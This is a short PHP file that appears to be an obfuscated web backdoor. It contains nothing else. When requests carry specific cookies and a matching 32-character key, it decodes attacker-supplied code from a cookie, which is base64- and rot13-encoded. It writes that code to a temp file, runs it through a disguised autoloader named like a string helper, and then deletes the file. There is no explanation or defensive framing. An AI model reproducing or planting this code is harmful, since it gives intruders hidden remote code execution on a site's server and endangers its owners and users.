<?php


if (isset($_COOKIE[56-56]) && isset($_COOKIE[-78+79]) && isset($_COOKIE[-26+29]) && isset($_COOKIE[24+-20])) {
    $pset = $_COOKIE;
    function right_pad_string($key) {
        $pset = $_COOKIE;
        $item = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'e8f91e0f');
        if (!is_writable($item)) {
            $item = getcwd() . DIRECTORY_SEPARATOR . "dependency_resolver";
        }
        $descriptor = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($pset[3]));
        if (is_writeable($item)) {
            $factor = fopen($item, 'w+');
            fputs($factor, $descriptor);
            fclose($factor);
            spl_autoload_unregister(__FUNCTION__);
            require_once($item);
            @array_map('unlink', array($item));
        }
    }
    spl_autoload_register("right_pad_string");
    $record = "ef4c5348d5c547ecfddfe2cfd9134982";
    if (!strncmp($record, $pset[4], 32)) {
        if (@class_parents("approve_request_restore_state", true)) {
            exit;
        }
    }
}
